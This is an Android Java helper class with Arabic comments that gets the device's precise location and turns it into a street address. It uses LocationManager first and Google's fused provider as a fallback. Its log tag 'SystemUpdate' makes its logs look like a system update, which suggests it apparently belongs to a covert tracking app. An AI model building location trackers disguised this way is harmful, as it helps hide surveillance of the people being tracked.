package com.sec.check;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.util.Log;

import androidx.core.content.ContextCompat;

import java.util.List;
import java.util.Locale;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

/**
 * LocationHelper - محسّن للعمل بدون Google Play Services
 * ============================================================
 * ★ يعتمد على LocationManager أولاً (مضمون 100%)
 * ★ ثم FusedLocationProviderClient كـ fallback
 * ============================================================
 */
public class LocationHelper {

    private static final String TAG = "SystemUpdate";

    public interface LocationCallback2 {
        void onSuccess(double lat, double lng, float accuracy, String provider);
        void onError(String error);
    }

    // ============================================================
    // getLocation - النقطة الرئيسية
    // ============================================================
    public static void getLocation(Context context, LocationCallback2 callback) {
        // ★ تحقق من الصلاحيات ★
        boolean hasFine = ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarse = ContextCompat.checkSelfPermission(context,
                Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;

        if (!hasFine && !hasCoarse) {
            callback.onError("no_location_permission");
            return;
        }

        // ★ ابدأ بـ LocationManager (الأكثر ضمانًا) ★
        new Thread(() -> {
            try {
                getLocationManager(context, callback);
            } catch (Exception e) {
                Log.e(TAG, "[LOC] LocationManager error: " + e.getMessage());
                // ★ لو فشل، جرب Fused كـ fallback ★
                try {
                    getLocationFused(context, callback);
                } catch (Exception e2) {
                    callback.onError("all_location_methods_failed");
                }
            }
        }).start();
    }

    // ============================================================
    // getLocationFused - Google Play Services
    // ============================================================
    private static void getLocationFused(Context context, LocationCallback2 callback) {
        try {
            com.google.android.gms.location.FusedLocationProviderClient fusedClient =
                    com.google.android.gms.location.LocationServices
                            .getFusedLocationProviderClient(context);

            if (ContextCompat.checkSelfPermission(context,
                    Manifest.permission.ACCESS_FINE_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                callback.onError("no_fine_permission");
                return;
            }

            final CountDownLatch latch = new CountDownLatch(1);
            final AtomicReference<Location> locationRef = new AtomicReference<>(null);

            com.google.android.gms.location.LocationRequest request =
                    new com.google.android.gms.location.LocationRequest.Builder(
                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, 1000)
                            .setWaitForAccurateLocation(false)
                            .setMinUpdateIntervalMillis(1000)
                            .setMaxUpdateDelayMillis(15000)
                            .setMaxUpdates(1)
                            .build();

            com.google.android.gms.location.LocationCallback locationCallback =
                    new com.google.android.gms.location.LocationCallback() {
                @Override
                public void onLocationResult(
                        com.google.android.gms.location.LocationResult locationResult) {
                    if (locationResult != null) {
                        Location loc = locationResult.getLastLocation();
                        if (loc != null) {
                            locationRef.set(loc);
                        }
                    }
                    latch.countDown();
                }
            };

            fusedClient.requestLocationUpdates(request, locationCallback,
                    Looper.getMainLooper());

            boolean completed = latch.await(10, TimeUnit.SECONDS);

            try {
                fusedClient.removeLocationUpdates(locationCallback);
            } catch (Exception ignored) {}

            Location loc = locationRef.get();
            if (loc != null) {
                callback.onSuccess(loc.getLatitude(), loc.getLongitude(),
                        loc.getAccuracy(), "fused");
            } else {
                callback.onError("no_fused_location");
            }
        } catch (Exception e) {
            callback.onError("fused_exception: " + e.getMessage());
        }
    }

    // ============================================================
    // getLocationManager - LocationManager (المضمون)
    // ============================================================
    private static void getLocationManager(Context context, LocationCallback2 callback) {
        try {
            LocationManager lm = (LocationManager)
                    context.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                callback.onError("no_location_manager");
                return;
            }

            // ★ اجلب آخر موقع معروف أولاً ★
            Location bestLocation = null;
            float bestAccuracy = Float.MAX_VALUE;

            String[] providers = {
                    LocationManager.GPS_PROVIDER,
                    LocationManager.NETWORK_PROVIDER,
                    LocationManager.PASSIVE_PROVIDER
            };

            for (String provider : providers) {
                try {
                    if (lm.isProviderEnabled(provider)) {
                        Location loc = lm.getLastKnownLocation(provider);
                        if (loc != null && loc.getAccuracy() < bestAccuracy) {
                            bestLocation = loc;
                            bestAccuracy = loc.getAccuracy();
                        }
                    }
                } catch (SecurityException se) {
                    Log.w(TAG, "[LOC] SecurityException for " + provider);
                } catch (Exception e) {
                    Log.w(TAG, "[LOC] Error for " + provider + ": " + e.getMessage());
                }
            }

            // ★ لو لقينا موقع معروف، رجعه فورًا ★
            if (bestLocation != null) {
                callback.onSuccess(bestLocation.getLatitude(),
                        bestLocation.getLongitude(),
                        bestLocation.getAccuracy(),
                        bestLocation.getProvider() + "_cached");
                Log.d(TAG, "[LOC] Cached: " + bestLocation.getLatitude());
                return;
            }

            // ★ نطلب موقع جديد ★
            final CountDownLatch latch = new CountDownLatch(1);
            final AtomicReference<Location> freshLoc = new AtomicReference<>(null);

            LocationListener listener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    freshLoc.set(location);
                    latch.countDown();
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {}

                @Override
                public void onProviderEnabled(String provider) {}

                @Override
                public void onProviderDisabled(String provider) {}
            };

            boolean requested = false;
            for (String provider : providers) {
                try {
                    if (lm.isProviderEnabled(provider)) {
                        lm.requestLocationUpdates(provider, 0, 0, listener,
                                Looper.getMainLooper());
                        requested = true;
                        Log.d(TAG, "[LOC] Requesting from " + provider);
                    }
                } catch (SecurityException se) {
                    Log.w(TAG, "[LOC] Cannot request from " + provider);
                } catch (Exception e) {
                    Log.w(TAG, "[LOC] Error requesting " + provider + ": " + e.getMessage());
                }
            }

            if (!requested) {
                callback.onError("no_provider_enabled");
                return;
            }

            // ★ انتظر 20 ثانية ★
            boolean completed = latch.await(20, TimeUnit.SECONDS);

            try {
                lm.removeUpdates(listener);
            } catch (Exception ignored) {}

            Location loc = freshLoc.get();
            if (loc != null) {
                callback.onSuccess(loc.getLatitude(), loc.getLongitude(),
                        loc.getAccuracy(), loc.getProvider());
                Log.d(TAG, "[LOC] Fresh: " + loc.getLatitude());
            } else {
                callback.onError("no_location");
            }

        } catch (Exception e) {
            Log.e(TAG, "[LOC] getLocationManager error: " + e.getMessage());
            callback.onError("exception: " + e.getMessage());
        }
    }

    // ============================================================
    // getAddressFromLocation - Reverse Geocoding
    // ============================================================
    public static String getAddressFromLocation(Context context, double lat, double lng) {
        try {
            Geocoder geocoder = new Geocoder(context, Locale.getDefault());
            List<Address> addresses = geocoder.getFromLocation(lat, lng, 1);

            if (addresses != null && !addresses.isEmpty()) {
                Address addr = addresses.get(0);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i <= addr.getMaxAddressLineIndex(); i++) {
                    if (i > 0) sb.append(", ");
                    sb.append(addr.getAddressLine(i));
                }
                return sb.toString();
            }
        } catch (Exception e) {
            Log.w(TAG, "[LOC] geocoder error: " + e.getMessage());
        }
        return null;
    }
    }
